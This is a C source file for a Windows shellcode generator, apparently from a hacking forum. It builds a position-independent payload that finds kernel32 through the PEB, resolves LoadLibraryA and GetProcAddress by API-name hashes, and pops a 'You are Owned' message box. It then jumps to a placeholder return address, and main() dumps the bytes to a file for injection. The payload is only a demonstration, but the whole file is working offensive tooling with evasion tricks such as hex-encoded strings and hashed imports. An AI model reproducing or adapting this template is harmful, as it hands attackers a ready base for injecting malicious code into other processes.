/*
* A Shell Code Generator In C
* Original Code : Guys from RohitAb.com forum (Zaryum)
* Modified By : @Ice3man
*
* Email : Iceman12@protonmail.com
*
*/

#include <Windows.h>
#include <stdio.h>
#include "ntdll.h"

#pragma comment(lib, "ntdll.lib")

typedef HMODULE (WINAPI *pLoad)(char *lpLibFileName);
typedef int (WINAPI *pGet)(HMODULE hModule, char *lpProcName);
typedef int (WINAPI *pMessage)(HWND hWnd, char *lpText, char *lpCaption, UINT uType);

void WINAPI Code()
{
	PIMAGE_DOS_HEADER pIDH;
	PIMAGE_NT_HEADERS pINH;
	PIMAGE_EXPORT_DIRECTORY pIED;

	ULONG i,Hash;
	PUCHAR ptr;

	HMODULE hModule;

	PULONG Function,Name;
	PUSHORT Ordinal;

	PPEB Peb;
	PLDR_DATA_TABLE_ENTRY Ldr;

	PVOID Kernel32Base;
	pLoad pLoadLibrary=NULL;
	pGet pGetProcAddress=NULL;
	pMessage pMessageBoxA=NULL;

	char user32[] = {0x75, 0x73, 0x65, 0x72, 0x33, 0x32, 0x2E, 0x64, 0x6C, 0x6C, 0x00}; //user32.dll
	char Message[] = {0x4D, 0x65, 0x73, 0x73, 0x61, 0x67, 0x65, 0x42, 0x6F, 0x78, 0x41, 0x00}; //MessageBoxA

	char text[] = {0x59, 0x6F, 0x75, 0x20, 0x41, 0x72, 0x65, 0x20, 0x4F, 0x77, 0x6E, 0x65, 0x64, 0x00}; //You are Owned
	char title[] = {0x40, 0x49, 0x63, 0x65, 0x33, 0x6D, 0x61, 0x6E, 0x00}; //@Ice3man


	// Get the base address of kernel32
	Peb=NtCurrentPeb();
	Ldr=CONTAINING_RECORD(Peb->Ldr->InMemoryOrderModuleList.Flink,LDR_DATA_TABLE_ENTRY,InMemoryOrderLinks.Flink); // Get the first entry (process executable)

	Ldr=CONTAINING_RECORD(Ldr->InMemoryOrderLinks.Flink,LDR_DATA_TABLE_ENTRY,InMemoryOrderLinks.Flink); // Second entry (ntdll)
	Ldr=CONTAINING_RECORD(Ldr->InMemoryOrderLinks.Flink,LDR_DATA_TABLE_ENTRY,InMemoryOrderLinks.Flink); // kernel32 is located at third entry

	Kernel32Base=Ldr->DllBase;

	pIDH=(PIMAGE_DOS_HEADER)Kernel32Base;
	pINH=(PIMAGE_NT_HEADERS)((PUCHAR)Kernel32Base+pIDH->e_lfanew);

	pIED=(PIMAGE_EXPORT_DIRECTORY)((PUCHAR)Kernel32Base+pINH->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

	Function=(PULONG)((PUCHAR)Kernel32Base+pIED->AddressOfFunctions);
	Name=(PULONG)((PUCHAR)Kernel32Base+pIED->AddressOfNames);

	Ordinal=(PUSHORT)((PUCHAR)Kernel32Base+pIED->AddressOfNameOrdinals);

	for(i=0;i<pIED->NumberOfNames;i++)
	{
		Hash=0;
		ptr=(PUCHAR)Kernel32Base+Name[i];

		// Compute the hash

		while(*ptr)
	    {
		    Hash=((Hash<<8)+Hash+*ptr)^(*ptr<<16);
		    ptr++;
	    }

		if(Hash==0xeec1e396) // Hash of LoadLibraryA
		{
			pLoadLibrary=(pLoad)((PUCHAR)Kernel32Base+Function[Ordinal[i]]); // Get the function address
			break;
		}
	}

	for(i=0;i<pIED->NumberOfNames;i++)
	{
		Hash=0;
		ptr=(PUCHAR)Kernel32Base+Name[i];

		// Compute the hash

		while(*ptr)
	    {
		    Hash=((Hash<<8)+Hash+*ptr)^(*ptr<<16);
		    ptr++;
	    }

		if (Hash==0xc5e5447a) // Hash of GetProcAddress
		{
			pGetProcAddress=(pGet)((PUCHAR)Kernel32Base+Function[Ordinal[i]]); // Get the function address
			break;
		}
	}

	hModule = pLoadLibrary(user32);
	pMessageBoxA = (pMessage) pGetProcAddress(hModule, Message);

	pMessageBoxA(NULL, text, title, MB_OK | MB_ICONINFORMATION);

	__asm {
		mov eax, 0xCCCCCCCC
		jmp eax
	}

}

// This is used to calculate the code size

DWORD WINAPI CodeEnd()
{
	return 0;
}

int main(int argc,char* argv[])
{
	HANDLE hFile;

	PVOID mem=NULL;
	ULONG CodeSize=(ULONG)CodeEnd-(ULONG)Code,size=4096,write;

	NTSTATUS status;
	
	if(argc<3)
	{
		printf("\n[*] ShellCodeGenerator : A ShellCOde Generation TOOL");
		printf("\n[*] Written By : @Ice3man");
		printf("\nUsage:\n");

		printf("\n%s /dump [Path]\n", argv[0]);
		printf("Dump the shellcode into file\n");

		return -1;
	}

	if(!strcmp(argv[1],"/dump"))
	{
		hFile=CreateFile(argv[2],GENERIC_WRITE,FILE_SHARE_READ|FILE_SHARE_WRITE,NULL,CREATE_ALWAYS,0,NULL); // Create the file

		if(hFile==INVALID_HANDLE_VALUE)
		{
			printf("\nError: Unable to create file (%u)\n",GetLastError());
			return -1;
		}

		if(!WriteFile(hFile,Code,CodeSize,&write,NULL)) // Write the shellcode into file
		{
			printf("\nError: Unable to write file (%u)\n", GetLastError());

			NtClose(hFile);
			return -1;
		}

		printf("\nShellcode successfully dumped\n");
		printf("Shellcode size: %u bytes\n",CodeSize);

		NtClose(hFile);
	}

	else
	{
		printf("\nError: Invalid arguments\n");
		return -1;
	}

	return 0;
}

